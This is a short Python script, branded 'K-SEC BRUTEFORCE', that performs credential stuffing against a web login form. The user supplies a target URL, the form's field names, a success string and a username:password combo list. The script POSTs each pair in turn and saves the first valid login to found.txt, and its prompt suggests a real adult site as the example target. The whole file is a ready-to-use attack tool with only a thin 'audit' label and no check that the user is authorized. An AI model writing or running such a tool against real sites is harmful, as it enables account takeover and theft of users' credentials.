import requests
import time
from colorama import Fore, Style, init


init(autoreset=True)

def display_banner():
    banner = f"""
{Fore.CYAN}  _  __       {Fore.MAGENTA}  _____ ______ _____ 
{Fore.CYAN} | |/ /       {Fore.MAGENTA} / ____|  ____/ ____|
{Fore.CYAN} | ' / ______ {Fore.MAGENTA}| (___ | |__ | |     
{Fore.CYAN} |  < |______|{Fore.MAGENTA} \___ \|  __|| |     
{Fore.CYAN} | . \        {Fore.MAGENTA} ____) | |___| |____ 
{Fore.CYAN} |_|\_\       {Fore.MAGENTA}|_____/|______\_____|
          {Fore.YELLOW}>> K-SEC BRUTEFORCE <<
    """
    print(banner)

def k_sec_brute():
    display_banner()

   
    target = input(f"{Fore.CYAN}[?] Target URL (e.g. https://pornhub/login): ")
    u_field = input(f"{Fore.CYAN}[?] Username Parameter Name: ")
    p_field = input(f"{Fore.CYAN}[?] Password Parameter Name: ")
    success_trigger = input(f"{Fore.CYAN}[?] Success Message (e.g. 'Welcome' or 'Dashboard'): ")
    combo_path = input(f"{Fore.CYAN}[?] Combo List Path (e.g. combo.txt): ")

    print(f"\n{Fore.YELLOW}{'='*50}")
    print(f"{Fore.YELLOW}[!] AUDIT STARTED AT: {time.strftime('%H:%M:%S')}")
    print(f"{Fore.YELLOW}{'='*50}\n")

  
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) K-SEC/1.0'
    }

    try:
        with open(combo_path, 'r', encoding='utf-8') as file:
            for line in file:
                line = line.strip()
                if not line or ":" not in line:
                    continue
                
                username, password = line.split(":", 1)
                
            
                payload = {u_field: username, p_field: password}

                try:
                   
                    response = requests.post(target, data=payload, headers=headers, timeout=5)

                    if success_trigger in response.text:
                        print(f"{Fore.GREEN}[+] SUCCESS: {username} | {password}")
                      
                        with open("found.txt", "a") as f:
                            f.write(f"{username}:{password}\n")
                        print(f"{Fore.YELLOW}[*] Saved to found.txt")
                        return # Stop after finding valid login
                    else:
                        print(f"{Fore.RED}[-] FAILED: {username}:{password}")

                except requests.exceptions.RequestException as e:
                    print(f"{Fore.RED}[!] Error connecting to target: {e}")
                    break

    except FileNotFoundError:
        print(f"{Fore.RED}[!] Error: File '{combo_path}' not found!")

    print(f"\n{Fore.YELLOW}{'='*50}")
    print(f"{Fore.YELLOW}[!] AUDIT FINISHED.")
    print(f"{Fore.YELLOW}{'='*50}")

if __name__ == "__main__":
    k_sec_brute()